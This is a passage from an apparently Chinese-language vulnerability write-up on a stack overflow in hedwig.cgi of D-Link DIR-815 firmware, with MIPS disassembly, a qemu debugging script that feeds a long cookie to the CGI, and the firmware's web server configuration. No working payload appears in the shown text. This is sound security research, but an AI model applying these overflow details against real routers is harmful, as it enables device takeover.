class="line">.text:00402478                 lui     $a1, 0x42  # &#39;B&#39;</span><br><span class="line">.text:0040247C                 la      $t9, dlcfg_main</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p><strong>采取软链接方式调用程序，并对调用时的binary名称比较，选择处理数据的主函数，因此找到调用hedwig.cgi时对应的main函数hedwigcgi_main：</strong><br>首先看到在函数开始时：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:0040950C                 li      $a2, 0x11        # n</span><br><span class="line">.text:00409510                 lw      $gp, 0x4E8+var_4D8($sp)</span><br><span class="line">.text:00409514                 lui     $a0, 0x42  # &#39;B&#39;</span><br><span class="line">.text:00409518                 la      $t9, getenv</span><br><span class="line">.text:0040951C                 nop</span><br><span class="line">.text:00409520                 jalr    $t9 ; getenv</span><br><span class="line">.text:00409524                 la      $a0, aRequest_method  # &quot;REQUEST_METHOD&quot;</span><br><span class="line">.text:00409528                 lw      $gp, 0x4E8+var_4D8($sp)</span><br><span class="line">.text:0040952C                 bnez    $v0, loc_409540</span><br><span class="line">.text:00409530                 nop</span><br><span class="line">.text:00409534                 lui     $v0, 0x42  # &#39;B&#39;</span><br><span class="line">.text:00409538                 b       loc_4095C8</span><br><span class="line">.text:0040953C                 addiu   $a1, $v0, (aNoRequest - 0x420000)  # &quot;no REQUEST&quot;</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>程序通过getenv的方式获取HTTP数据包中的数据，流程应该为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主Web程序监听端口-&gt;传送HTTP数据包-&gt;</span><br><span class="line">HTTP中headers等数据通过环境变量的方式传给cgi处理程序-&gt;</span><br><span class="line">cgi程序通过getenv获取数据并处理返回给主程序-&gt;向客户端返回响应数据</span><br><span class="line">#POST具体数据可以通过类似输入流传入 ：echo &quot;uid&#x3D;aaa&quot;| &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi</span><br></pre></td></tr></table></figure>
<p><strong>因此，动态调试时只需要使用qemu -E设置环境变量或者在mips系统中export设置环境变量并允许程序即可模拟Web场景</strong><br>下面看到处理cookie的过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00409640                 la      $t9, sess_get_uid</span><br><span class="line">.text:00409644                 nop</span><br><span class="line">.text:00409648                 jalr    $t9 ; sess_get_uid</span><br><span class="line">.text:0040964C                 move    $a0, $s5</span><br><span class="line">.text:00409650                 lw      $gp, 0x4E8+var_4D8($sp)</span><br><span class="line">.text:00409654                 nop</span><br><span class="line">.text:00409658                 la      $t9, sobj_get_string</span><br><span class="line">.text:0040965C                 nop</span><br><span class="line">.text:00409660                 jalr    $t9 ; sobj_get_string</span><br><span class="line">.text:00409664                 move    $a0, $s5</span><br><span class="line">.text:00409668                 lw      $gp, 0x4E8+var_4D8($sp)</span><br><span class="line">.text:0040966C                 lui     $a1, 0x42  # &#39;B&#39;</span><br><span class="line">.text:00409670                 la      $t9, sprintf</span><br><span class="line">.text:00409674                 move    $a3, $v0</span><br><span class="line">.text:00409678                 move    $a2, $s2</span><br><span class="line">.text:0040967C                 la      $a1, aSSPostxml  # &quot;%s&#x2F;%s&#x2F;postxml&quot;</span><br><span class="line">.text:00409680                 jalr    $t9 ; sprintf</span><br></pre></td></tr></table></figure>
<p><strong>sess_get_uid function为提取cookie中”uid=”后的字符串</strong><br><strong>这段最终调用为:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(stack_addr,&quot;%s&#x2F;%s&#x2F;postxml&quot;,&quot;&#x2F;runtime&#x2F;session&quot;,cookie_after_treat)</span><br></pre></td></tr></table></figure>
<p>此时当cookie过长会覆盖栈中内容<br>当hedwigcgi_main返回时：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00409A30                 lw      $fp, 0x4E8+var_8($sp)</span><br><span class="line">.text:00409A34                 lw      $s7, 0x4E8+var_C($sp)</span><br><span class="line">.text:00409A38                 lw      $s6, 0x4E8+var_10($sp)</span><br><span class="line">.text:00409A3C                 lw      $s5, 0x4E8+var_14($sp)</span><br><span class="line">.text:00409A40                 lw      $s4, 0x4E8+var_18($sp)</span><br><span class="line">.text:00409A44                 lw      $s3, 0x4E8+var_1C($sp)</span><br><span class="line">.text:00409A48                 lw      $s2, 0x4E8+var_20($sp)</span><br><span class="line">.text:00409A4C                 lw      $s1, 0x4E8+var_24($sp)</span><br><span class="line">.text:00409A50                 lw      $s0, 0x4E8+var_28($sp)</span><br><span class="line">.text:00409A54                 jr      $ra</span><br></pre></td></tr></table></figure>
<p>造成栈溢出<br>不过后面的程序流程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:004096B0                 la      $a0, aVarTmpTemp_xml  # &quot;&#x2F;var&#x2F;tmp&#x2F;temp.xml&quot;</span><br><span class="line">.text:004096B4                 jalr    $t9 ; fopen</span><br><span class="line">.text:004096B8                 la      $a1, aW          # &quot;w&quot;</span><br><span class="line">.text:004096BC                 lw      $gp, 0x4E8+var_4D8($sp)</span><br><span class="line">.text:004096C0                 bnez    $v0, loc_4096D4</span><br><span class="line">.text:004096C4                 move    $s2, $v0</span><br><span class="line">.text:004096C8                 lui     $v0, 0x42  # &#39;B&#39;</span><br><span class="line">.text:004096CC                 b       loc_409A64</span><br><span class="line">.text:004096D0                 addiu   $a1, $v0, (aUnableToOpenTe - 0x420000)  # &quot;unable to open temp file.&quot;</span><br></pre></td></tr></table></figure>
<p><strong>当在/var/tmp/下成功打开temp.xml (‘w’模式),便会有：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00409958                 jalr    $t9 ; sobj_get_string</span><br><span class="line">.text:0040995C                 move    $a0, $s5</span><br><span class="line">.text:00409960                 lw      $gp, 0x4E8+var_4D8($sp)</span><br><span class="line">.text:00409964                 lui     $a1, 0x42  # &#39;B&#39;</span><br><span class="line">.text:00409968                 la      $t9, sprintf</span><br><span class="line">.text:0040996C                 lui     $a2, 0x42  # &#39;B&#39;</span><br><span class="line">.text:00409970                 la      $a1, aHtdocsWebincFa  # &quot;&#x2F;htdocs&#x2F;webinc&#x2F;fatlady.php\nprefix&#x3D;%s&#x2F;%&quot;...</span><br><span class="line">.text:00409974                 la      $a2, aRuntimeSession  # &quot;&#x2F;runtime&#x2F;session&quot;</span><br><span class="line">.text:00409978                 move    $a3, $v0</span><br><span class="line">.text:0040997C                 jalr    $t9 ; sprintf</span><br></pre></td></tr></table></figure>
<p>即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sprintf(stack_addr,&quot;&#x2F;htdocs&#x2F;webinc&#x2F;fatlady.php\nprefix&#x3D;%s&#x2F;%s&quot;,&quot;&#x2F;runtime&#x2F;session&quot;,cookie_after_treat)</span><br></pre></td></tr></table></figure>
<p>这里也会造成栈溢出，真实应该是要在这里debug<br>(因为此处sprintf会覆盖前一个sprintf的数据)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">因为如果不存在&#x2F;var&#x2F;tmp(打开&#x2F;var&#x2F;tmp&#x2F;temp.xml失败)：</span><br><span class="line">.text:004096C4                 move    $s2, $v0</span><br><span class="line">.text:004096C8                 lui     $v0, 0x42  # &#39;B&#39;</span><br><span class="line">.text:004096CC                 b       loc_409A64</span><br><span class="line">.text:004096D0                 addiu   $a1, $v0, (aUnableToOpenTe - 0x420000)  # &quot;unable to open temp file.&quot;</span><br><span class="line">会直接返回unable to open temp file</span><br><span class="line">所以真实环境应该存在&#x2F;var&#x2F;tmp文件夹</span><br><span class="line">debug时在.&#x2F;var&#x2F;下手动创建即可</span><br></pre></td></tr></table></figure>
<p>还需要POST数据包中包含”uid=……”<br>否则有一处会分配空间失败：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00409AB0                 la      $t9, sobj_strdup</span><br><span class="line">.text:00409AB4                 lw      $a0, 4($s0)</span><br><span class="line">.text:00409AB8                 jalr    $t9 ; sobj_strdup</span><br><span class="line">.text:00409ABC                 nop</span><br><span class="line">.text:00409AC0                 lw      $ra, 0x20+var_4($sp)</span><br><span class="line">.text:00409AC4                 lui     $v1, 0x43  # &#39;C&#39;</span><br><span class="line">.text:00409AC8                 lw      $gp, 0x20+var_10($sp)</span><br><span class="line">.text:00409ACC                 lw      $s0, 0x20+var_8($sp)</span><br><span class="line">.text:00409AD0                 sw      $v0, haystack</span><br><span class="line">.text:00409AD4                 jr      $ra</span><br><span class="line">.text:00409AD8                 addiu   $sp, 0x20</span><br></pre></td></tr></table></figure>
<p>从而最后：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:004096D4                 lw      $v0, haystack</span><br><span class="line">.text:004096DC                 nop</span><br><span class="line">.text:004096E0                 bnez    $v0, loc_4096F0</span><br><span class="line">.text:004096E4                 lui     $v0, 0x42  # &#39;B&#39;</span><br><span class="line">.text:004096E8                 b       loc_409A64</span><br><span class="line">.text:004096EC                 addiu   $a1, $v0, (aNoXmlData_ - 0x420000)  # &quot;no xml data.&quot;</span><br></pre></td></tr></table></figure>
<p>此时也不会进入第二个sprintf，不过第一处依然存在栈溢出<br>不过这样情况下在我的MIPS虚拟机下复现失败<br>但是会产生signal 11，失败应该只是环境问题</p>
<h4 id="0x03-Debug-Environment-with-QEMU-User-Mode"><a href="#0x03-Debug-Environment-with-QEMU-User-Mode" class="headerlink" title="0x03 Debug Environment with QEMU User Mode"></a>0x03 Debug Environment with QEMU User Mode</h4><p><strong>动态debug环境：静态编译的qemu+chroot+IDA</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">INPUT&#x3D;&quot;$1&quot;</span><br><span class="line">COOKIE&#x3D;&quot;$2&quot;</span><br><span class="line">PORT&#x3D;&quot;$3&quot;</span><br><span class="line">LEN&#x3D;$(echo -n &quot;$INPUT&quot; | wc -c)</span><br><span class="line"></span><br><span class="line">echo $INPUT | chroot . .&#x2F;qemu-mipsel -E CONTENT_LENGTH&#x3D;$LEN -E CONTENT_TYPE&#x3D;&quot;application&#x2F;x-www-form-urlencoded&quot; -E REQUEST_METHOD&#x3D;&quot;POST&quot; -E HTTP_COOKIE&#x3D;$COOKIE -E REQUEST_URI&#x3D;&quot;&#x2F;hedwig.cgi&quot; -E REMOTE_ADDR&#x3D;&quot;192.168.1.1&quot;  -g $PORT   &#x2F;htdocs&#x2F;web&#x2F;hedwig.cgi</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;debug.sh  &quot;uid&#x3D;1234&quot;  &quot;uid&#x3D;kirin&quot;  1234</span><br></pre></td></tr></table></figure>
<p><strong>IDA下remote gdb debugger连接对应端口即可(推荐IDA 6.8)</strong></p>
<h4 id="0x04-Web-Server-Build-with-QEMU-System-Mode"><a href="#0x04-Web-Server-Build-with-QEMU-System-Mode" class="headerlink" title="0x04 Web Server Build with QEMU System Mode"></a>0x04 Web Server Build with QEMU System Mode</h4><p>利用qemu-system-mipsel重现web服务环境<br>首先观察文件系统<br>主要看有那些服务&amp;&amp;命令，推测大致启动模式<br>而后在MIPS中重现关键web服务即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">主要看各个bin下(&#x2F;bin &#x2F;sbin &#x2F;usr&#x2F;bin &#x2F;usr&#x2F;sbin ......)以及web服务特点</span><br><span class="line">首先从web目录下确定服务为php+cgi</span><br><span class="line">在命令中发现httpd</span><br><span class="line">猜测httpd监听web端口，调用cgi&amp;&amp;php程序处理数据并返回客户端</span><br></pre></td></tr></table></figure>
<p>下面找到相关web配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~&#x2F;router&#x2F;DIR-815&#x2F;squashfs-root$ find .&#x2F; -name &quot;*http*&quot;</span><br><span class="line">.&#x2F;usr&#x2F;sbin&#x2F;httpc</span><br><span class="line">.&#x2F;sbin&#x2F;httpd</span><br><span class="line">.&#x2F;etc&#x2F;services&#x2F;HTTP&#x2F;httpcfg.php</span><br><span class="line">.&#x2F;etc&#x2F;services&#x2F;HTTP&#x2F;httpsvcs.php</span><br></pre></td></tr></table></figure>
<p>看到httpcfg.php:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line">Umask 026</span><br><span class="line">PIDFile &#x2F;var&#x2F;run&#x2F;httpd.pid</span><br><span class="line">#LogGMT On</span><br><span class="line">#ErrorLog &#x2F;dev&#x2F;console</span><br><span class="line"></span><br><span class="line">Tuning</span><br><span class="line">&#123;</span><br><span class="line">    NumConnections 15</span><br><span class="line">    BufSize 12288</span><br><span class="line">    InputBufSize 4096</span><br><span class="line">    ScriptBufSize 4096</span><br><span class="line">    NumHeaders 100</span><br><span class="line">    Timeout 60</span><br><span class="line">    ScriptTimeout 60</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Control</span><br><span class="line">&#123;</span><br><span class="line">    Types</span><br><span class="line">    &#123;</span><br><span class="line">        text&#x2F;html   &#123; html htm &#125;</span><br><span class="line">        text&#x2F;xml    &#123; xml &#125;</span><br><span class="line">        text&#x2F;plain  &#123; txt &#125;</span><br><span class="line">        image&#x2F;gif   &#123; gif &#125;</span><br><span class="line">        image&#x2F;jpeg  &#123; jpg &#125;</span><br><span class="line">        text&#x2F;css    &#123; css &#125;</span><br><span class="line">        application&#x2F;octet-stream &#123; * &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Specials</span><br><span class="line">    &#123;</span><br><span class="line">        Dump        &#123; &#x2F;dump &#125;</span><br><span class="line">        CGI         &#123; cgi &#125;</span><br><span class="line">        Imagemap    &#123; map &#125;</span><br><span class="line">        Redirect    &#123; url &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    External</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;usr&#x2F;sbin&#x2F;phpcgi &#123; php &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;?</span><br><span class="line">include &quot;&#x2F;htdocs&#x2F;phplib&#x2F;phyinf.php&quot;;</span><br><span class="line"></span><br><span class="line">function http_server($sname, $uid, $ifname, $af, $ipaddr, $port, $hnap, $widget, $smart404)</span><br><span class="line">&#123;</span><br><span class="line">    echo</span><br><span class="line">        &quot;Server&quot;.                           &quot;\n&quot;.</span><br><span class="line">        &quot;&#123;&quot;.                                &quot;\n&quot;.</span><br><span class="line">        &quot;   ServerName \&quot;&quot;.$sname.&quot;\&quot;&quot;.             &quot;\n&quot;.</span><br><span class="line">        &quot;   ServerId \&quot;&quot;.$uid.&quot;\&quot;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;   Family &quot;.$af.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   Interface &quot;.$ifname.                    &quot;\n&quot;.</span><br><span class="line">        &quot;   Address &quot;.$ipaddr.                  &quot;\n&quot;.</span><br><span class="line">        &quot;   Port &quot;.$port.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   Virtual&quot;.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   &#123;&quot;.                         &quot;\n&quot;.</span><br><span class="line">        &quot;       AnyHost&quot;.                   &quot;\n&quot;.</span><br><span class="line">        &quot;       Control&quot;.                   &quot;\n&quot;.</span><br><span class="line">        &quot;       &#123;&quot;.                     &quot;\n&quot;.</span><br><span class="line">        &quot;           Alias &#x2F;&quot;.               &quot;\n&quot;.</span><br><span class="line">        &quot;           Location &#x2F;htdocs&#x2F;web&quot;.          &quot;\n&quot;.</span><br><span class="line">        &quot;           IndexNames &#123; index.php &#125;&quot;.      &quot;\n&quot;;</span><br><span class="line">    if ($uid&#x3D;&#x3D;&quot;LAN-1&quot;||$uid&#x3D;&#x3D;&quot;WAN-1&quot;)   echo</span><br><span class="line">        &quot;           External&quot;.              &quot;\n&quot;.</span><br><span class="line">        &quot;           &#123;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;               &#x2F;usr&#x2F;sbin&#x2F;phpcgi &#123; txt &#125;&quot;.  &quot;\n&quot;.</span><br><span class="line">        &quot;           &#125;&quot;.                 &quot;\n&quot;;</span><br><span class="line">    if ($widget &gt; 0)    echo</span><br><span class="line">        &quot;           External&quot;.              &quot;\n&quot;.</span><br><span class="line">        &quot;           &#123;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;               &#x2F;usr&#x2F;sbin&#x2F;phpcgi &#123; router_info.xml &#125;&quot;.&quot;\n&quot;.</span><br><span class="line">        &quot;               &#x2F;usr&#x2F;sbin&#x2F;phpcgi &#123; post_login.xml &#125;&quot;.&quot;\n&quot;.</span><br><span class="line">        &quot;           &#125;&quot;.                 &quot;\n&quot;;   </span><br><span class="line">    echo</span><br><span class="line">        &quot;       &#125;&quot;.                     &quot;\n&quot;;</span><br><span class="line">    if ($smart404 !&#x3D; &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        echo</span><br><span class="line">        &#39;       Control&#39;.                           &#39;\n&#39;.</span><br><span class="line">        &#39;       &#123;&#39;.                                 &#39;\n&#39;.</span><br><span class="line">        &#39;           Alias &#x2F;smart404&#39;.               &#39;\n&#39;.</span><br><span class="line">        &#39;           Location &#x2F;htdocs&#x2F;smart404&#39;.     &#39;\n&#39;.</span><br><span class="line">        &#39;       &#125;&#39;.                                 &#39;\n&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($hnap &gt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        echo</span><br><span class="line">        &quot;       Control&quot;.                   &quot;\n&quot;.</span><br><span class="line">        &quot;       &#123;&quot;.                     &quot;\n&quot;.</span><br><span class="line">        &quot;           Alias &#x2F;HNAP1&quot;.              &quot;\n&quot;.</span><br><span class="line">        &quot;           Location &#x2F;htdocs&#x2F;HNAP1&quot;.        &quot;\n&quot;.</span><br><span class="line">        &quot;           External&quot;.              &quot;\n&quot;.</span><br><span class="line">        &quot;           &#123;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;               &#x2F;usr&#x2F;sbin&#x2F;hnap &#123; hnap &#125;&quot;.   &quot;\n&quot;.</span><br><span class="line">        &quot;           &#125;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;           IndexNames &#123; index.hnap &#125;&quot;.     &quot;\n&quot;.</span><br><span class="line">        &quot;       &#125;&quot;.                     &quot;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo</span><br><span class="line">        &quot;   &#125;&quot;.                         &quot;\n&quot;.</span><br><span class="line">        &quot;&#125;&quot;.                                &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function ssdp_server($sname, $uid, $ifname, $af, $ipaddr)</span><br><span class="line">&#123;</span><br><span class="line">    if ($af&#x3D;&#x3D;&quot;inet6&quot;) return;</span><br><span class="line">    echo</span><br><span class="line">        &quot;Server&quot;.                           &quot;\n&quot;.</span><br><span class="line">        &quot;&#123;&quot;.                                &quot;\n&quot;.</span><br><span class="line">        &quot;   ServerName \&quot;&quot;.$sname.&quot;\&quot;&quot;.             &quot;\n&quot;.</span><br><span class="line">        &quot;   ServerId \&quot;&quot;.$uid.&quot;\&quot;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;   Family &quot;.$af.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   Interface &quot;.$ifname.                    &quot;\n&quot;.</span><br><span class="line">        &quot;   Port 1900&quot;.                     &quot;\n&quot;.</span><br><span class="line">        &quot;   Address 239.255.255.250&quot;.               &quot;\n&quot;.</span><br><span class="line">        &quot;   Datagrams On&quot;.                      &quot;\n&quot;.</span><br><span class="line">        &quot;   Virtual&quot;.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   &#123;&quot;.                         &quot;\n&quot;.</span><br><span class="line">        &quot;       AnyHost&quot;.                   &quot;\n&quot;.</span><br><span class="line">        &quot;       Control&quot;.                   &quot;\n&quot;.</span><br><span class="line">        &quot;       &#123;&quot;.                     &quot;\n&quot;.</span><br><span class="line">        &quot;           Alias &#x2F;&quot;.               &quot;\n&quot;.</span><br><span class="line">        &quot;           Location &#x2F;htdocs&#x2F;upnp&#x2F;docs&#x2F;&quot;.$uid.&quot;\n&quot;.</span><br><span class="line">        &quot;           External&quot;.              &quot;\n&quot;.</span><br><span class="line">        &quot;           &#123;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;               &#x2F;htdocs&#x2F;upnp&#x2F;ssdpcgi &#123; * &#125;&quot;.&quot;\n&quot;.</span><br><span class="line">        &quot;           &#125;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;       &#125;&quot;.                     &quot;\n&quot;.</span><br><span class="line">        &quot;   &#125;&quot;.                         &quot;\n&quot;.</span><br><span class="line">        &quot;&#125;&quot;.                                &quot;\n&quot;.</span><br><span class="line">        &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upnp_server($sname, $uid, $ifname, $af, $ipaddr, $port)</span><br><span class="line">&#123;</span><br><span class="line">    if ($af&#x3D;&#x3D;&quot;inet6&quot;) return;</span><br><span class="line">    echo</span><br><span class="line">        &quot;Server&quot;.                           &quot;\n&quot;.</span><br><span class="line">        &quot;&#123;&quot;.                                &quot;\n&quot;.</span><br><span class="line">        &quot;   ServerName \&quot;&quot;.$sname.&quot;\&quot;&quot;.             &quot;\n&quot;.</span><br><span class="line">        &quot;   ServerId \&quot;&quot;.$uid.&quot;\&quot;&quot;.                 &quot;\n&quot;.</span><br><span class="line">        &quot;   Family &quot;.$af.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   Interface &quot;.$ifname.                    &quot;\n&quot;.</span><br><span class="line">        &quot;   Address &quot;.$ipaddr.                  &quot;\n&quot;.</span><br><span class="line">        &quot;   Port &quot;.$port.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   Virtual&quot;.                       &quot;\n&quot;.</span><br><span class="line">        &quot;   &#123;&quot;.                         &quot;\n&quot;.</span><br><span class="line">        &quot;       AnyHost&quot;.                   &quot;\n&quot;.</span><br><span class="line">        &quot;       Control&quot;.                   &quot;\n&quot;.</span><br><span class="line">        &quot;       &#123;&quot;.                     &quot;\n&quot;.</span><br><span class="line">        &quot;           Alias &#x2F;&quot;.               &quot;\n&quot;.</span><br><span class="line">        &quot;           Location &#x2F;htdocs&#x2F;upnp&#x2F;docs&#x2F;&quot;.$uid.&quot;\n&quot;.</span><br><span class="line">        &quot;       &#125;&quot;.                     &quot;\n&quot;.</span><br><span class="line">        &quot;   &#125;&quot;.                         &quot;\n&quot;.</span><br><span class="line">        &quot;&#125;&quot;.                                &quot;\n&quot;.</span><br><span class="line">        &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 